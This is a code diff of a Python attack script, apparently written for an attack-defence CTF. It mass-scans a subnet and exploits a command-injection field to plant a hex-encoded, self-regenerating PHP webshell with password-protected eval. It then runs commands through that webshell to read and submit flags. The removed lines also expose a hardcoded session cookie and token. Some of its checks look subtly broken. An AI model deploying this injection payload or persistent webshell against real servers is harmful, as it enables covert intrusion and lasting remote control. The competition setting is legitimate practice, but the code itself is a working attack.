@@ -1,10 +1,9 @@
-import requests
-import time
 import re
-import logging
-from time import sleep
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from time import sleep
+import logging
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 # 精确屏蔽 InsecureRequestWarning 警告
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -14,37 +13,17 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 # 配置参数
 IP_RANGE = range(170, 252)
 PORTS = [80]  # 可扩展常见Web端口
-TIMEOUT = 5
+TIMEOUT = 3
 THREADS = 20
-RETRY_TIMES = 2
-UPLOAD_NAME = ".nodead.php"#马2的名字
 FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
 QUESTION_ID = "90122"
-FLAG_SUBMIT_URL = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
-headers = {
-    "Host": "172.19.6.100",
-    "Connection": "keep-alive",
-    "sec-ch-ua-platform": "\"Windows\"",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/plain, */*",
-    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
-    "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
-    "sec-ch-ua-mobile": "?0",
-    "Origin": "https://172.19.6.100",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Dest": "empty",
-    "Referer": "https://172.19.6.100/competition_web/",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "zh-CN,zh;q=0.9",
-    "Cookie": "um_auth=1; sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0xOFQyMTowNDozNy4wNDM0NzYyOTQrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODE3ODY4Nzd9.2P20iiNX9A7bTDaU1feQ2C7Cl-cND3pZbww9g8GchZA; competition_session=MTc4MTc4NzgwMnxOd3dBTkRjMU5GcE5WVmxYU3pORE4wY3lSa3RVTkVoYVJ6TkdWRmd5U0ZsSlRVNVlSRFZLU1VSS1NrOUNSMUZTTWxWR01sQkpTbEU9fGxfegurUX-usTdtd4GMFjfO8Uw5zY7ZPv33bKxYzckM",
-}
-
+ma1=".nodead.php"
+ma2=".config.php"
 
 def process_host():
     """并发探活，返回可达IP列表"""
     live_ips = []
-    base_ips = [f"192.168.{i}.3" for i in IP_RANGE]
+    base_ips = [f"192.168.{i}.2" for i in IP_RANGE]
 
     def check_ip(ip):
         for port in PORTS:
@@ -71,81 +50,87 @@ def process_host():
     return live_ips
 
 
-def upload_file(ip_list):
-    """上传文件到目标服务器"""
-    upload_res = {}
-    file = {
-        'file': (UPLOAD_NAME, open('nodead.php', 'rb'), 'image/png'),  #打开nodead.php，名字改成.nodead.php上传
-        # 图片文件格式:file={'字段名': ('文件名', 文件内容/对象, 'MIME类型')，submit},字段名需要抓包获取
-        'submit': (None, 'Submit'),
-    }
-
-    def upload(ip):
-        url = f"http://{ip}/upload.php"
+def upload_muma(ip_list):
+    """并发向每个IP发送命令注入请求，提取flag"""
+    data = {"ip": "127.0.0.1;system('echo 3C3F7068700A69676E6F72655F757365725F61626F72742874727565293B200A7365745F74696D655F6C696D69742830293B202020200A756E6C696E6B285F5F46494C455F5F293B20200A0A2466696C65203D20272E696E646578322E706870273B200A24636F6465203D20273C3F706870206966286D643528245F4745545B2270617373225D293D3D22646230383864376664363134323264306464396632313532666435353031323722297B406576616C28245F504F53545B22636D64225D293B7D203F3E273B0A0A7768696C6520283129207B0A2020202066696C655F7075745F636F6E74656E7473282466696C652C2024636F6465293B200A2020202073797374656D2827746F756368202D6D202D642022323031382D30312D30312030303A30303A3030222027202E202466696C65293B200A2020202066696C655F7075745F636F6E74656E747328272E636F6E666967312E706870272C24636F6465293B0A2020202066696C655F7075745F636F6E74656E747328272E6170702E706870272C24636F6465293B0A2020202066696C655F7075745F636F6E74656E747328272E696E6465782E706870272C24636F6465293B0A2020202075736C6565702835303030293B200A7D0A3F3E |xxd -r -ps > /var/www/html/.nodead.php');"}
+    upload_url=[]
+    def attack(ip):
+        url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
         try:
-            response = requests.post(url, files=file, headers=headers, timeout=TIMEOUT)
-            if response.status_code == 200:
-                print(f"[+] {ip} 文件上传成功")
-                response=requests.get(f"http://{ip}/{UPLOAD_NAME}")#访问.nodead.php，生成.config.php
-                if response.status_code == 200:
-                    print(f"[+] {ip} 木马激活成功")
-                return ip, True
-            else:
-                print(f"[-] {ip} 上传失败，状态码: {response.status_code}")
-                return ip, False
-        except Exception as e:
-            print(f"[-] {ip} 连接错误: {str(e)}")
-            return ip, False
-
-    with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        futures = {executor.submit(upload, ip): ip for ip in ip_list}
-        for future in as_completed(futures):
-            ip, res = future.result()
-            upload_res[ip] = res
-
-    # 写入结果文件
-    with open("自动_upload_res.txt", "w", encoding="utf-8") as f:
-        for ip, res in upload_res.items():
-            f.write(f"{ip}: {res}\n")
-    return upload_res
-
-
-def get_flag(ip_list):
-    """从目标服务器获取flag"""
-    # 方法2：通过上传的webshell获取flag
-    flag_dict = {}
-    data = {'cmd': 'cat /flag*'}
-
-    def attack(target_ip):
-        shell_url = f"http://{target_ip}/upload/.config.php?pass=nima"  # 不死马生成.config.php
-        try:
-            r = requests.post(shell_url, data=data, timeout=TIMEOUT)
-            if r.status_code == 200:
-                match = FLAG_PATTERN.search(r.text)
-                if match:
-                    flag = match.group(0)  # 完整flag
-                    logging.info(f"{target_ip} found flag: {flag}")
-                    return target_ip, flag
+            if requests.post(url, data=data, timeout=TIMEOUT)==200:
+                logging.info(f"{ip} 植入不死马成功")
+                url1 = f"http://{ip}/{ma1}"
+                if requests.get(url=url1, timeout=0.5) ==200: # 访问不死马1，循环生成不死马2
+                    url2 = f"http://{ip}/{ma2}"
+                    logging.info(f"{ip} 生成不死马")
+                    if requests.get(url=url2, timeout=0.5)==200:  # 激活不死马2
+                        logging.info(f"{ip} 激活不死马")
+                        f.write(url2 + "\n")
+                        upload_url.append(url2)  # 保存马2路径
+                        return url2
+                    else:
+                        logging.info(f"{ip} 不死马访问失败")
+                        return None
                 else:
-                    logging.warning(f"{target_ip} 200 but no flag")
-                    return target_ip, None
+                    logging.info(f"{ip} 不死马生成失败")
+                    return None
             else:
-                logging.warning(f"{target_ip} status {r.status_code}")
-                return target_ip, None
+                logging.info(f"{ip} 不死马上传失败")
+                return None
         except Exception as e:
-            logging.error(f"{target_ip} request failed: {e}")
-            return target_ip, None
+            logging.error(f"{ip} request failed: {e}")
+            return None
 
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         futures = {executor.submit(attack, ip): ip for ip in ip_list}
         for future in as_completed(futures):
-            ip, flag = future.result()
-            flag_dict[ip] = flag
+            if future.result():  #不管成功，失败都写入文件
+                upload_url.append(future.result())
 
-        # 写入结果文件
+    # 写入结果文件
+    with open("upload_url.txt", "w", encoding="utf-8") as f:
+        for url in upload_url:
+            f.write(f"{url}\n")
+    return upload_url
+
+
+def get_flag(upload_url):
+    """并发向每个木马url发送cmd，提取flag"""
+    flag_dict = {}
+    payload = {
+        "pass": "nima",  # nima => db088d7fd61422d0dd9f2152fd550127
+        "cmd": "system('cat /flag');",
+    }
+
+    def attack(url):
+        try:
+            r = requests.post(url, data=payload, timeout=TIMEOUT)
+            if r.status_code == 200:
+                match = FLAG_PATTERN.search(r.text)
+                if match:
+                    flag = match.group(0)  # 完整flag
+                    logging.info(f"{url} found flag: {flag}")
+                    return url, flag
+                else:
+                    logging.warning(f"{url} 200 but no flag")
+                    return url, None
+            else:
+                logging.warning(f"{url} status {r.status_code}")
+                return url, None
+        except Exception as e:
+            logging.error(f"{url} request failed: {e}")
+            return url, None
+
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        futures = {executor.submit(attack, url): url for url in upload_url}
+        for future in as_completed(futures):
+            url, flag = future.result()  # 不管成功，失败都写入文件
+            flag_dict[url] = flag
+
+    # 写入结果文件
     with open("自动_flag.txt", "w", encoding="utf-8") as f:
-        for ip, flag in flag_dict.items():
-            f.write(f"{ip}: {flag}\n")
+        for url, flag in flag_dict.items():
+            f.write(f"{url}: {flag}\n")
     return flag_dict
 
 
@@ -194,19 +179,17 @@ def upload_flag(flag_dict):
                     logging.error(f"{ip} upload exception: {e}")
                     f.write(f"{ip} error, status {resp.status_code}  {msg} 写入失败，自行写入{flag}\n")
                 sleep(20)
-
-    if __name__ == "__main__":
-        live = process_host()
-        upload_res = upload_file(live)
-        upload_success_iplist = []
-        for ip, res in upload_res.items():  # 找出上传成功的ip
-            if res:
-                upload_success_iplist.append(ip)
-        if upload_success_iplist:  # 获取上传成功的ip的flag
-            flags = get_flag(upload_success_iplist)
-            if flags:
-                upload_flag(flags)
             else:
-                logging.warning("No flags found.")
-        else:
-            logging.warning("No upload")
+                pass
+
+
+if __name__ == "__main__":
+    ip_list = process_host()
+    # with open("ip.txt", "r", encoding="utf-8") as f:
+    #     ip_list = f.readlines()
+    upload_url = upload_muma(ip_list)
+    flags = get_flag(upload_url)
+    if flags:  # 字典不为空，上传
+        upload_flag(flags)
+    else:
+        logging.warning("No flags found.")
